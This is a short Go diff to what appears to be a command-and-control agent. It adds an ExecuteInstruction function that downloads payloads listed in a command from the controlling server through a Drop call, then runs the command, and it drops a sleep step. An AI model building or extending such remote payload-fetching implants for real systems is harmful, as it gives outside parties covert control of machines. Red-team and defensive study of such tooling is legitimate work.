@@ -10,7 +10,7 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
-	"time"
+	"strings"
 
 	"../execute"
 	"../util"
@@ -71,7 +71,18 @@ func Execute(profile map[string]interface{}, command map[string]interface{}) {
 		fmt.Println("[+] Shutting down...")
 		util.StopProcess(os.Getpid())
 	}
-	time.Sleep(time.Duration(command["sleep"].(float64)) * time.Second)
+}
+
+// ExecuteInstruction takes the command and profile and executes that command step
+func ExecuteInstruction(command map[string]interface{}, profile map[string]interface{}) {
+	fmt.Printf("[*] Running instruction %.0f\n", command["id"])
+	payloads := strings.Split(strings.Replace(command["payload"].(string), " ", "", -1), ",")
+	for _, payload := range payloads {
+		if len(payload) > 0 {
+			Drop(profile["server"].(string), payload)
+		}
+	}
+	Execute(profile, command)
 }
 
 func request(address string, data []byte) []byte {
